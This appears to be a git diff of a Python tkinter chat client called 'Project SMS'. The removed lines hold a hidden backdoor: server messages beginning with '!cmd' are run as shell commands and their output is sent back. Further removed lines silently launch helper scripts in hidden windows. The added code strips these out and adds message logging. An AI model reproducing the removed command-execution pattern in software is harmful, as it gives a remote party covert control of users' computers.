@@ -6,133 +6,125 @@ import threading
 import subprocess
 import os
 import sys
+import time
 
-ACCOUNT_FILE = "account.json"
-TEMP_DIR = "tools/tmp"
-ADDITION_SCRIPT = "tools/addition.py"
-LOGIN_SCRIPT = "tools/login.py"
+# Define paths for account and log files
+ACCOUNT_FILE = "tools/tmp/account.json"
+LOG_FILE = "tools/tmp/logs/debug.log"
+SETTINGS_FILE = "tools/settings.json"
+
 connection_started = False
 connected = False
-client = None
 
-def execute_command(command):
-    try:
-        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
-        return output.decode('utf-8')
-    except subprocess.CalledProcessError as e:
-        return f"Command failed: {e.output.decode('utf-8')}"
+# Function to log messages when debugger is enabled
+def log_debug(message):
+    if DEBUGGER_ENABLED:
+        with open(LOG_FILE, 'a') as log_file:
+            log_file.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - {message}\n")
+        print(message)
 
+# Load debugger settings from settings.json
+def load_debugger_setting():
+    if os.path.exists(SETTINGS_FILE):
+        with open(SETTINGS_FILE, 'r') as file:
+            settings = json.load(file)
+            return settings.get("debugger_enabled", False)
+    return False
+
+# Save debugger settings to settings.json
+def save_debugger_setting(enabled):
+    settings = {"debugger_enabled": enabled}
+    with open(SETTINGS_FILE, 'w') as file:
+        json.dump(settings, file)
+
+# Function to toggle debugger on or off
+def toggle_debugger():
+    global DEBUGGER_ENABLED
+    DEBUGGER_ENABLED = not DEBUGGER_ENABLED
+    save_debugger_setting(DEBUGGER_ENABLED)
+    status = "enabled" if DEBUGGER_ENABLED else "disabled"
+    messagebox.showinfo("Debugger", f"Debugger is now {status}")
+
+# Function to send messages from the client
+def send_message(client, entry_message, text_area):
+    message = entry_message.get()
+    if message:
+        client.send(message.encode('utf-8'))
+        entry_message.delete(0, tk.END)
+        text_area.config(state=tk.NORMAL)
+        text_area.insert(tk.END, f"Me: {message}\n")
+        text_area.yview(tk.END)
+        text_area.config(state=tk.DISABLED)
+        log_debug(f"Sent message: {message}")  # Log message when sent
+
+# Function to receive messages from the server
 def receive_messages(client, text_area):
-    global connected
-    while connected:
+    while True:
         try:
             message = client.recv(1024).decode('utf-8')
-            if message.startswith("!cmd"):
-                command = message.split(" ", 1)[1]
-                result = execute_command(command)
-                client.send(f"!cmd_result {result}".encode('utf-8'))
-            else:
+            if message:
                 text_area.config(state=tk.NORMAL)
                 text_area.insert(tk.END, message + '\n')
                 text_area.yview(tk.END)
                 text_area.config(state=tk.DISABLED)
+                log_debug(f"Received message: {message}")  # Log received message
         except Exception as e:
-            messagebox.showerror("Error", f"Error: {e}")
+            log_debug(f"Error receiving message: {e}")
             client.close()
-            connected = False
             break
 
+# Main function to start the client
 def start_client():
-    global connection_started, connected, client
-
+    global connection_started, connected
     def on_connect_test():
         if connection_started or connected:
-            messagebox.showinfo("Can't connect again", "Connected to the server. Type !leave to leave the server")
-        else:
+            tk.messagebox.showinfo("Can't connect again", "Connected to the server. Type !leave to leave the server.")
+        else:         
+            def on_connect():
+                global connection_started, connected
+                connection_started = True
+                connected = True
+
+                # Extract connection info
+                connection_code = entry_connection.get()
+                server_ip, server_port = connection_code.split(":")
+                server_port = int(server_port)
+
+                client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                client.connect((server_ip, server_port))
+
+                log_debug(f"Connected to {server_ip}:{server_port}")  # Log connection info
+
+                connection_started = False
+                connected = True
+
+                receive_thread = threading.Thread(target=receive_messages, args=(client, text_area))
+                receive_thread.start()
+
+                # Bind the Enter key to send message
+                root.bind('<Return>', lambda event: send_message(client, entry_message, text_area))
+
+                button_send.config(command=lambda: send_message(client, entry_message, text_area))
+
             on_connect()
 
-    def on_connect():
-        global connection_started, connected, client
-        connection_started = True
-                        
-        connection_code = entry_connection.get()
-        try:
-            server_ip, server_port = connection_code.split(":")
-            server_port = int(server_port)
-
-            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            client.connect((server_ip, server_port))
-
-            connected = True
-            connection_started = False
-
-            receive_thread = threading.Thread(target=receive_messages, args=(client, text_area))
-            receive_thread.start()
-
-            def send_message():
-                message = entry_message.get()
-                if message and not message.startswith("!leave"):
-                    # Show message in the local text area (the sender's interface)
-                    text_area.config(state=tk.NORMAL)
-                    text_area.insert(tk.END, f"You: {message}\n")
-                    text_area.yview(tk.END)
-                    text_area.config(state=tk.DISABLED)
-
-                    # Send the message to the server
-                    client.send(message.encode('utf-8'))
-                    entry_message.delete(0, tk.END)  # Clear input after sending
-
-                elif message == "!leave":
-                    client.send(message.encode('utf-8'))
-                    connected = False
-                    client.close()
-                    entry_message.delete(0, tk.END)  # Clear input after sending
-                    messagebox.showinfo("Disconnected", "You have left the server.")
-            
-            client.send(client_username.encode('utf-8'))
-            button_send.config(command=send_message)
-
-        except Exception as e:
-            connection_started = False
-            connected = False
-            messagebox.showerror("Connection Error", f"Failed to connect: {e}")
-
-    # Function to handle closing the window
-    def on_closing():
-        global connected, client
-        if connected:
-            connected = False
-            client.close()  # Close the socket connection
-        root.destroy()  # Destroy the GUI window
-        sys.exit()  # Exit the script
-
     # Check if account file exists before running the client
-    account_file = os.path.join(TEMP_DIR, ACCOUNT_FILE)
-    if not os.path.exists(account_file):
-        messagebox.showerror("Error", "Account file not found. Launching login.py to create an account.")
-        # Run login.py in a hidden window (no cmd)
-        tools_folder = os.path.join(os.path.dirname(__file__), "tools")
-        login_script = os.path.join(tools_folder, "login.py")
-        if os.path.exists(login_script):
-            subprocess.Popen(["python", login_script], cwd=tools_folder, creationflags=subprocess.CREATE_NO_WINDOW)
-        else:
-            print("login.py not found. Exiting.")
+    if not os.path.exists(ACCOUNT_FILE):
+        tk.messagebox.showerror("Error", "Account file not found. Create an account first.")
         sys.exit()
     else:
-        with open(account_file, 'r') as file:
+        with open(ACCOUNT_FILE, 'r') as file:
             accountJSON = json.load(file)
             global client_username
             client_username = accountJSON['username']
-        
-    addition_script = os.path.join(ADDITION_SCRIPT)
-    if os.path.exists(addition_script):
-        subprocess.Popen(["python", addition_script], cwd=os.path.dirname(addition_script), creationflags=subprocess.CREATE_NO_WINDOW)
-    else:
-        print("addition.py not found. Proceeding with application startup.")
 
     # Start the main application UI
     root = tk.Tk()
     root.title("Project SMS")
+
+    # Create the debug button in the top right corner (i will use this for other settings later)
+    settings_button = tk.Button(root, text="Debug", command=toggle_debugger)
+    settings_button.pack(anchor="ne", padx=10, pady=5)
 
     frame = tk.Frame(root)
     frame.pack(padx=10, pady=10)
@@ -154,14 +146,14 @@ def start_client():
     button_send = tk.Button(frame, text="Send")
     button_send.pack(side=tk.LEFT)
 
-    # Bind the closing event to the on_closing function
-    root.protocol("WM_DELETE_WINDOW", on_closing)
-
     root.mainloop()
 
-# Check for temporary files folder before running
-temp_dir_file = os.path.join("tools", "tmp")
-if os.path.exists(temp_dir_file):
+# Load debugger settings at startup
+DEBUGGER_ENABLED = load_debugger_setting()
+
+# Ensure the log file path exists
+os.makedirs(os.path.dirname(LOG_FILE), exist_ok=True)
+
+# Start the client application
+if __name__ == "__main__":
     start_client()
-else:
-    print("Error Code 1: tmp folder doesn't exist")
